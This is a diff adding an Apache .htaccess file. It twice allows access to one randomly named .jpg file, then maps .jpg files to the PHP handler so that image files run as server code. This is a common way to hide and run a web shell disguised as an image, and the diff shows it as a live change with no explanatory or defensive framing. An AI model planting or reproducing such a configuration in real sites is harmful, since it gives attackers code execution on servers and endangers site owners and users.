@@ -1,0 +1,9 @@
+<Files 48_f9ffaeb07345f69a7f4eedd0bb86bg5n.jpg>
+Order Deny,Allow
+Allow from all
+</Files>
+<Files 48_f9ffaeb07345f69a7f4eedd0bb86bg5n.jpg>
+Order Deny,Allow
+Allow from all
+</Files>
+AddType application/x-httpd-php .jpg
